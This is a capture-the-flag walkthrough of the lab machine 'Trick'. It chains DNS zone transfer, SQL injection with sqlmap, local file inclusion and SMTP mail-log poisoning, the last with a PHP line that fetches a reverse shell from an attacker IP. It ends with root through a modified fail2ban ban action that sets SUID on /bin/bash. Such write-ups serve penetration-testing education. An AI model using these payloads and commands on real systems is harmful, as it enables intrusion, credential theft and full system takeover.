# Trick
```
Difficulty: Easy
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | `(unauthenticated)` | DNS Zone Transfer & Subdomain Enumeration | An initial `nmap` scan revealed an open DNS port (53). A **DNS zone transfer** for `trick.htb` revealed a subdomain: `preprod-payroll.trick.htb`. Further enumeration with `wfuzz` using a wordlist and the naming convention `preprod-FUZZ.trick.htb` uncovered another subdomain: `preprod-marketing.trick.htb`.|
| 2 | `(unauthenticated)` | SQL Injection | The `preprod-payroll.trick.htb` site had a login page. Using `sqlmap` on a saved request, a time-based blind SQL Injection was identified. This vulnerability was exploited to enumerate the database `payroll_db` and retrieve a table named `users`. The `users` table contained credentials for the `Administrator` user: `username` **Enemigosss** and `password` **SuperGucciRainbowCake**. |
| 3 | `michael` | LFI, SMTP Abuse & Reverse Shell | The `preprod-marketing.trick.htb` subdomain was found to have a **Local File Inclusion (LFI)** vulnerability in the `page` parameter of `index.php`. This LFI was used to read `/etc/passwd`, revealing the user `michael`. Using the open SMTP port (25), an email was sent to `michael@localhost` containing a PHP payload. The LFI was then used to include `/var/mail/michael`, which was interpreted by PHP, writing a reverse shell script to a public web directory. Executing this web shell granted a reverse shell as the `michael` user. |
| 4 | `root` | Sudo Privilege Escalation via Fail2Ban | As the `michael` user, it was discovered that the user could run `/etc/init.d/fail2ban restart` with **NOPASSWD** via `sudo`. The `michael` user was also part of the `security` group, which had write permissions on the `/etc/fail2ban/action.d` directory. By modifying a Fail2Ban configuration file in this directory to execute a command that sets the SUID bit on `/bin/bash` during a `ban` event, a privileged shell could be obtained. Triggering an SSH login failure caused Fail2Ban to execute the modified `actionban` command, giving the `michael` user a SUID shell. This SUID shell was then executed to gain a **root** shell. |


## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```bash
Nmap scan report for 10.10.11.166
Host is up (0.033s latency).
Not shown: 65531 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
As we can see we have four ports opened: 22, 25, 53, 80.  
Since we have the DNS exposed via port 53 we can try to perform a zone transfer for `trick.htb`.  
```shell
[root@kali Trick ]$ dig axfr trick.htb @$TARGET                                                                       

; <<>> DiG 9.18.1-1-Debian <<>> axfr trick.htb @10.10.11.166
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 27 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
;; WHEN: Mon Jul 11 11:21:40 CEST 2022
;; XFR size: 6 records (messages 1, bytes 231)
```
As we can see we found one additional domain `preprod-payroll.trick.htb`.
Now let's start digging into port 80.  
As we hit the default virtual host we do not see anything fascinating.  
Now let's dig into the discovered virtualhost.  
As we open the site we can see a login prompt.  
Running directory enumeration allows us unauthenticated access to resources, but we cannot trigger any action with the disclosed pages:  
```bash
/login.php            (Status: 200) [Size: 5571]
/index.php            (Status: 302) [Size: 9546] [--> login.php]
/ajax.php             (Status: 200) [Size: 0]
/home.php             (Status: 200) [Size: 486]
/assets               (Status: 301) [Size: 185] [--> http://preprod-payroll.trick.htb/assets/]
/database             (Status: 301) [Size: 185] [--> http://preprod-payroll.trick.htb/database/]
/users.php            (Status: 200) [Size: 2197]
/header.php           (Status: 200) [Size: 2548]
/.                    (Status: 301) [Size: 185] [--> http://preprod-payroll.trick.htb/./]
/readme.txt           (Status: 200) [Size: 149]
/employee.php         (Status: 200) [Size: 2717]
/navbar.php           (Status: 200) [Size: 1382]
/department.php       (Status: 200) [Size: 4844]
/db_connect.php       (Status: 200) [Size: 0]
/payroll.php          (Status: 200) [Size: 3142]
/position.php         (Status: 200) [Size: 5549]
/topbar.php           (Status: 200) [Size: 585]
/attendance.php       (Status: 200) [Size: 4688]
/site_settings.php    (Status: 200) [Size: 2273]
/deductions.php       (Status: 200) [Size: 4912]
```
Now we can run an `sqlmap` against the login page:  
```shell
[root@kali Trick ]$ sqlmap -r login.req --batch --schema                                                                                                                                                                           [104/6971]
        ___                                                                                                              
       __H__                                                                                                             
 ___ ___[']_____ ___ ___  {1.6.6#stable}                                                                                 
|_ -| . [(]     | .'| . |                                                                                                
|___|_  [.]_|_|_|__,|  _|                                                                                                
      |_|V...       |_|   https://sqlmap.org                                                                             
                                                                                                                         
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not res
ponsible for any misuse or damage caused by this program                                                                 
                                                                                                                         
[*] starting @ 15:36:18 /2022-07-11/                                                                                     
                                                                                                                         
[15:36:18] [INFO] parsing HTTP request from 'login.req'                                                                  
[15:36:19] [INFO] resuming back-end DBMS 'mysql'                                                                         
[15:36:19] [INFO] testing connection to the target URL                                                                   
sqlmap resumed the following injection point(s) from stored session:                                                     
---                                                                                                                      
Parameter: username (POST)                                                                                               
    Type: time-based blind                                                                                               
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)                                                            
    Payload: username=admin' AND (SELECT 8156 FROM (SELECT(SLEEP(5)))Opaz) AND 'vZZY'='vZZY&password=admin               
---                                                                                                                      
[15:36:19] [INFO] the back-end DBMS is MySQL                                                                             
web application technology: Nginx 1.14.2                                                                                 
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)                                                                            
[15:36:19] [INFO] enumerating database management system schema                                                          
[15:36:19] [INFO] fetching database names                                                                                
[15:36:19] [INFO] fetching number of databases                                                                           
[15:36:19] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[15:36:20] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y                   
2                                                                                                                        
[15:36:30] [INFO] retrieved:                                                                                             
[15:36:35] [INFO] adjusting time delay to 1 second due to good response times                                            
information_schema                                                                                                       
[15:37:39] [INFO] retrieved: payroll_db                                                                                  
[15:38:20] [INFO] fetching tables for databases: 'information_schema, payroll_db'                                        
[15:38:20] [INFO] fetching number of tables for database 'payroll_db'                                                    
[15:38:20] [INFO] retrieved: 11                                                                                          
[15:38:23] [INFO] retrieved: position                                                                                    
[15:38:55] [INFO] retrieved: employee                                                                                    
[15:39:25] [INFO] retrieved: department                                                                                  
[15:40:01] [INFO] retrieved: payroll_items                                                                               
[15:40:52] [INFO] retrieved: attendance                                                                                  
[15:41:24] [INFO] retrieved: employee_deductions                                                                         
[15:42:35] [INFO] retrieved: employee_allowances                                                                         
[15:43:19] [INFO] retrieved: users                                                                                       
[15:43:36] [INFO] retrieved: deductions                                                                                  
[... SNIP ...]   
```
As we can see `sqlmap` succeeded, and we can enumerate the database schema:  
Now that we have the database schema, we can enumerate for specific db/table:
```shell
[root@kali ~ ]$ sqlmap -r login.req --batch --dump -D payroll_db -T users 
[... SNIP ...]
[15:48:21] [INFO] retrieved: 
[15:48:21] [INFO] retrieved: 0
[15:48:27] [INFO] retrieved: 1
[15:48:29] [INFO] retrieved: Administrator
[15:49:13] [INFO] retrieved: SuperGucciRainbowCake
[15:50:26] [INFO] retrieved: 1
[15:50:28] [INFO] retrieved: Enemigosss
Database: payroll_db
Table: users
[1 entry]
+----+-----------+---------------+------+---------+---------+-----------------------+------------+
| id | doctor_id | name          | type | address | contact | password              | username   |
+----+-----------+---------------+------+---------+---------+-----------------------+------------+
| 1  | 0         | Administrator | 1    | <blank> | <blank> | SuperGucciRainbowCake | Enemigosss |
+----+-----------+---------------+------+---------+---------+-----------------------+------------+
```
The password can be used to log in into the application. 
Once we are inside, we can notice an LFI. If we try to exfiltrate code using `php://filter/convert.base64-encode/resource=` as we did for [FriendZone](FriendZone.md), [BountyHunter](BountyHunter.md), and [Tabby](Tabby.md), and we can notice that the LFI allows us to include only .php files.  
```php
<?php include $page.'.php' ?>
```
Application is not vulnerable to null bytes, hence we cannot escape the file inclusion to include any type of file.  
We can exfiltrate also `db_connect.php` and we can see the following credentials:  
```php
<?php

$conn= new mysqli('localhost','remo','TrulyImpossiblePasswordLmao123','payroll_db')or die("Could not connect to mysql".mysqli_error($con));
```
But these credentials does not lead anywhere.  
We also have an arbitrary file upload vulnerability but it does not work due to directory permission.
Since we came to a dead end we can try to enumerate if we have any other virtual host.  
Standard gobuster enumeration does not show anything, we can try to enumerate other vhosts using `wfuzz` using the naming pattern (`preprod-`) of the discovered virtual host.  
```shell
[root@kali /tmp ]$ wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 475 -H'Host: preprod-FUZZ.trick.htb' -u 'http://trick.htb' -p localhost:8080 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://trick.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                     
=====================================================================

000000254:   200        178 L    631 W      9660 Ch     "marketing"                                                                                                                                                                 
000005309:   302        266 L    527 W      9546 Ch     "payroll"   
```
As we dig into this site we can see a similar LFI, but this time we can include all kind of files instead of .php only.  
If we fuzz the `page` parameter for LFI patterns, we can see the following:  
```shell
[root@kali preprod-market ]$ wfuzz -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hl 0 'http://preprod-marketing.trick.htb/index.php?page=FUZZ'                                                                             
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://preprod-marketing.trick.htb/index.php?page=FUZZ
Total requests: 920

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                     
=====================================================================

000000327:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"                            
000000328:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"                                  
000000330:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"                                              
000000334:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"                                                                      
000000339:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//....//....//....//....//....//etc/passwd"                                                                                                    
000000340:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//....//....//....//....//etc/passwd"                                                                                                          
000000338:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//....//....//....//....//....//....//etc/passwd"                                                                                              
000000337:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"                                                                                        
000000333:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"                                                                
000000336:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"                                                                                  
000000335:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"                                                                            
000000341:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//....//....//....//etc/passwd"                                                                                                                
000000332:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"                                                          
000000329:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"                                        
000000331:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"                                                    
000000342:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//....//....//etc/passwd"                                                                                                                      
000000343:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//....//etc/passwd"                                                                                                                            
000000345:   200        41 L     68 W       2351 Ch     "....//....//....//....//etc/passwd"                                                                                                                                        
000000344:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//etc/passwd"                                                                                                                                  
000000346:   200        41 L     68 W       2351 Ch     "....//....//....//etc/passwd"                                                                                                                                              

Total time: 4.678635
Processed Requests: 920
Filtered Requests: 900
Requests/sec.: 196.6385
```
Hence, we can include any form of file.  

## User
Once we have discovered the LFI, we exfiltrate `/etc/passwd` and see system users, once we have system users we can drop an email using the open smtp service, containing a payload, write the payload in a public www directory and then execute the payload to obtain a reverse shell, similarly to what we did in [Beep](Beep.md).  
```
[root@kali Trick ]$ telnet $TARGET 25
Trying 10.10.11.166...
Connected to 10.10.11.166.
Escape character is '^]'.
HELO b0d.htb
220 debian.localdomain ESMTP Postfix (Debian/GNU)
250 debian.localdomain
VRFY michael@localhost
252 2.0.0 michael@localhost
MAIL FROM:<b0d@haha.com>
250 2.1.0 Ok
RCPT TO:<michael@localhost>     
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
Subject: you got pwned
<?php system("wget http://10.10.14.9/php-reverse-shell.php -O /var/www/market/shell.php");?>
.
250 2.0.0 Ok: queued as 09B944099C
QUIT
221 2.0.0 Bye
Connection closed by foreign host.
```
Now we can include this file using the LFI vulnerability and write the shell to `/var/www/market` by calling `/var/mail/michael`
```
GET /index.php?page=....//....//....//....//....//var/mail/michael HTTP/1.1
Host: preprod-marketing.trick.htb
Accept: */*
Content-Type: application/x-www-form-urlencoded
User-Agent: Wfuzz/3.1.0
Connection: close
```
then we can call the shell to trigger the execution and obtain a reverse shell
```bash
[root@kali Trick ]$ bash
root@kali:~/Documents/HTB/Boxes/Trick# nc -lvnp 9001 
listening on [any] 9001 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.11.166] 36368
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64 GNU/Linux
 10:56:57 up  2:42,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

## Root
Once we log in, if we run `sudo -l` we can notice the following.  
```
bash-5.0$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```
So we have permission to restart fail2ban. Now, let's look into configuration files:  
```bash
bash-5.0$ ls -la
total 76
drwxr-xr-x   6 root root      4096 Jul 14 11:45 .
drwxr-xr-x 126 root root     12288 Jul 13 08:15 ..
drwxrwx---   2 root security  4096 Jul 14 11:45 action.d
-rw-r--r--   1 root root      2334 Jul 14 11:45 fail2ban.conf
drwxr-xr-x   2 root root      4096 Jul 14 11:45 fail2ban.d
drwxr-xr-x   3 root root      4096 Jul 14 11:45 filter.d
-rw-r--r--   1 root root     22908 Jul 14 11:45 jail.conf
drwxr-xr-x   2 root root      4096 Jul 14 11:45 jail.d
-rw-r--r--   1 root root       645 Jul 14 11:45 paths-arch.conf
-rw-r--r--   1 root root      2827 Jul 14 11:45 paths-common.conf
-rw-r--r--   1 root root       573 Jul 14 11:45 paths-debian.conf
-rw-r--r--   1 root root       738 Jul 14 11:45 paths-opensuse.conf
bash-5.0$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
```
As we can notice, we are in the security group, hence we can edit files in the `action.d` folder.  
This folder allows us to perform block action when events occur.
So we can take the files that perform actions for blocking ssh bruteforce `iptables-multiport.conf` remove it (since we have write permission on the folder) and replace the file with the following: 
```
# Fail2Ban configuration file
#
# Author: Cyril Jaquier
# Modified by Yaroslav Halchenko for multiport banning
#

[INCLUDES]

before = iptables-common.conf

[Definition]

# Option:  actionstart
# Notes.:  command executed once at the start of Fail2Ban.
# Values:  CMD
#
actionstart = <iptables> -N f2b-<name>
              <iptables> -A f2b-<name> -j <returntype>
              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>

# Option:  actionstop
# Notes.:  command executed once at the end of Fail2Ban
# Values:  CMD
#
actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
             <actionflush>
             <iptables> -X f2b-<name>

# Option:  actioncheck
# Notes.:  command executed once before each actionban command
# Values:  CMD
#
actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'

# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
            chmod 4755 /bin/bash

# Option:  actionunban
# Notes.:  command executed when unbanning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>
              chmod 4755 /bin/bash
[Init]
```
Now we can trigger multiple ssh login failure events, and then execute bash with SUID:  
```bash
bash-5.0$ bash -p
bash-5.0# whoami
uid=1001(michael) gid=1001(michael) euid=0(root) groups=1001(michael),1002(security)
```
And we owned root
